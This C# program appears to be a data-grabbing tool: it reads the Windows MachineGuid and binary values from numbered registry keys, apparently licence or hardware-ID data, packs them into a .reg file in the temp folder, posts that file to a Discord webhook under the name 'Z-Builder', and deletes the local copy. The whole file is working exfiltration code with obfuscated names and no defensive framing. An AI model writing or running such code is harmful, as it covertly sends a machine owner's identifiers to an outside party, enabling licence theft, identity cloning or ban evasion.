using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;

namespace GenReg
{
    class Program
    {
        static void Main(string[] args)
        {
            string command = args[0];
            // [5RND]==[9RND]==[5keys]==[9keys]==
            //string command = "[29540]==[463350482]==[\"14770\",\"14770c\",\"14770w\",\"14770wc\"]==[\"347512861\",\"347512861c\"]==[WEbHook";
            string[] SplittedCommand = command.Split(new[] { "==" }, StringSplitOptions.RemoveEmptyEntries);
            string FiveRND = SplittedCommand[0].Substring(1, SplittedCommand[0].Length - 2);
            string NineRND = SplittedCommand[1].Substring(1, SplittedCommand[1].Length - 2);
            string FiveKeys = SplittedCommand[2].Substring(1, SplittedCommand[2].Length - 2);
            string NineKeys = SplittedCommand[3].Substring(1, SplittedCommand[3].Length - 2);
            string WebHook = SplittedCommand[4].Substring(1, SplittedCommand[4].Length - 2);
            FiveKeys = FiveKeys.Replace("\"", "");
            NineKeys = NineKeys.Replace("\"", "");
            string[] FiveKeysList = FiveKeys.Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            string[] NineKeysList = NineKeys.Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            string[] GUIDs = GrabMGuID();
            string k9rands = Get9RND();
            string k5rands = Get5RND();
            string totalstring9 = "";
            string totalstring5 = "";
            foreach (string g in rand9list(k9rands, NineKeysList))
            {
                totalstring9 += g;
            }
            foreach (string g in rand5list(k5rands, FiveKeysList))
            {
                totalstring5 += g;
            }
            string Results = CreateReg(FiveRND, NineRND, totalstring5, totalstring9, GUIDs[0], GUIDs[1]);
            using (StreamWriter sw = File.CreateText(Environment.ExpandEnvironmentVariables("%TEMP%") + "\\SetReg.reg"))
            {
                sw.Write(Results);
            }
            Webhook hook = new Webhook(WebHook);
            hook.Name = "Z-Builder";
            hook.ProfilePictureUrl = "https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128";
            hook.SendMessage(Environment.ExpandEnvironmentVariables("%TEMP%") + "\\SetReg.reg");
            File.Delete(Environment.ExpandEnvironmentVariables("%TEMP%") + "\\SetReg.reg");
        }
        public static string Get5RND()
        {
            try
            {
                RegistryKey jdfddnjdz = Registry.CurrentUser;
                jdfddnjdz = jdfddnjdz.OpenSubKey(@"Software\Microsoft", true);
                string[] dshg = jdfddnjdz.GetSubKeyNames();
                foreach (String umm in dshg)
                {
                    if (Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length == 5)
                    {
                        return umm;
                    }
                    else if (!Regex.IsMatch(umm, "^[0-9]+$", RegexOptions.Compiled) && umm.Length != 5)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public static string Get9RND()
        {
            try
            {
                RegistryKey subKey = Registry.CurrentUser;
                string[] subkeyNemez = subKey.GetSubKeyNames();
                foreach (String valuef in subkeyNemez)
                {
                    if (Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length == 9)
                    {
                        return valuef;
                    }
                    else if (!Regex.IsMatch(valuef, "^[0-9]+$", RegexOptions.Compiled) && valuef.Length != 9)
                    {

                    }
                }
                return "NULL";
            }
            catch
            {
                return "NULL";
            }
        }
        public static string grab5keys()
        {
            string f5keys = "";
            RegistryKey reg5num = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft");
            foreach (string subKeyName in reg5num.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 5)
                {
                    RegistryKey og = reg5num.OpenSubKey(subKeyName);
                    foreach (var ggfg in og.GetValueNames())
                    {
                        f5keys += @"""" + ggfg + @"""" + ",";
                    }
                }
            }
            return f5keys.TrimEnd(',');
        }
        public static string grab9keys()
        {
            string f9keys = "";
            RegistryKey subKey = Registry.CurrentUser;
            foreach (string subKeyName in subKey.GetSubKeyNames())
            {
                if (Regex.IsMatch(subKeyName, "^[0-9]+$", RegexOptions.Compiled) && subKeyName.Length == 9)
                {
                    RegistryKey ghjk = subKey.OpenSubKey(subKeyName);
                    string[] okg = subKey.OpenSubKey(subKeyName).GetValueNames();
                    foreach (var s in okg)
                    {
                        //string gdg = (string)ghjk.GetValue(s);
                        f9keys += @"""" + s + @"""" + ",";
                    }
                    break;
                }
            }
            return f9keys.TrimEnd(',');
        }
        public static string[] GrabMGuID()
        {
            string[] guidvalues = new string[2] { "", "" };
            bool strchange13 = Environment.Is64BitOperatingSystem;
            try
            {
                RegistryKey strchange15 =
RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
RegistryView.Registry32);
                if (strchange15 != null)
                {
                    string strchange16 = (string)strchange15.GetValue("MachineGuid");
                    guidvalues[1] = strchange16;
                    strchange15.Close();
                }
                if (strchange13 == true)
                {
                    RegistryKey strchange14 =
            RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
                RegistryView.Registry64);
                    strchange14 = strchange14.OpenSubKey(@"SOFTWARE\\Microsoft\\Cryptography", false);
                    if (strchange14 != null)
                    {
                        string strchange17 = (string)strchange14.GetValue("MachineGuid");
                        guidvalues[0] = strchange17;
                    }
                    strchange14.Close();
                }
                else if (strchange13 == false)
                {
                    strchange15 = strchange15 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine,
RegistryView.Registry32);
                    strchange15 = strchange15.OpenSubKey(@"SOFTWARE\\Microsoft\\Cryptography", false);
                    if (strchange15 != null)
                    {
                        string strchange16 = (string)strchange15.GetValue("MachineGuid");
                        guidvalues[1] = strchange16;
                        strchange15.Close();
                    }
                }
            }
            catch
            {

            }
            return guidvalues;
        }
        public static string CreateReg(string FiveRND, string NineRND, string FiveRands, string NineRands, string MGUID1, string MGUID2)
        {
            string RegCode = string.Join(Environment.NewLine,
                "Windows Registry Editor Version 5.00",
                "[-HKEY_CURRENT_USER\\" + NineRND + "]", "[HKEY_CURRENT_USER\\" + NineRND + "]",
                NineRands,
                "",
                "[-HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
                "[HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
                FiveRands,
                "",
                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]",
                "\"MachineGuid\"=\"" + MGUID1 + "\"",
                "",
                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography]",
                "\"MachineGuid\"=\"" + MGUID2 + "\"");
            return RegCode;
        }
        public static List<string> rand9list(string rands9, string[] listggg9)
        {
            List<string> listxd = new List<string>();
            RegistryKey strchange26;
            if (Environment.Is64BitOperatingSystem)
            {
                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            try
            {
                strchange26 = strchange26.OpenSubKey(rands9, true);
                string[] strchange27 = strchange26.GetValueNames();
                for (int i = 0; i < listggg9.Length; i++)
                {
                    byte[] strchange29 = (byte[])strchange26.GetValue(strchange27[i]);
                    string strchange30 = BitConverter.ToString(strchange29).Replace("-", ",").ToLower();
                    string strchange32 = @"""" + listggg9[i] + @"""=hex:" + strchange30 + Environment.NewLine;
                    listxd.Add(strchange32);
                }
            }
            catch
            {

            }
            return listxd;
        }
        public static string Formatfff = @"[^a-zA-Z0-9`!@#$%^&*()_+|\-=\\{}\[\]:"";'<>?,./]";
        public static List<string> rand5list(string rands5, string[] listggg5)
        {
            List<string> listxd = new List<string>();
            RegistryKey strchange35;
            if (Environment.Is64BitOperatingSystem)
            {
                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            try
            {
                strchange35 = strchange35.OpenSubKey(@"Software\Microsoft\" + rands5, true);
                string[] strchange36 = strchange35.GetValueNames();
                for (int i = 0; i < listggg5.Length; i++)
                {
                    byte[] strchange39 = (byte[])strchange35.GetValue(strchange36[i]);
                    string strchange40 = BitConverter.ToString(strchange39).Replace("-", ",").ToLower();
                    string strchange41 = @"""" + listggg5[i] + @"""=hex:" + strchange40 + Environment.NewLine;
                    listxd.Add(strchange41);
                }
            }
            catch
            {

            }
            return listxd;
        }
    }
    class Webhook
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");

            if (file != null)
            {
                if (File.Exists(file))
                {
                    byte[] bytes = File.ReadAllBytes(file);
                    data.Add(new ByteArrayContent(bytes), "SetReg.reg", "SetReg.reg");
                    var resp = Client.PostAsync(Url, data).Result;
                    return resp.StatusCode == HttpStatusCode.NoContent;
                }
                return true;
            }
            return false;
        }
    }
}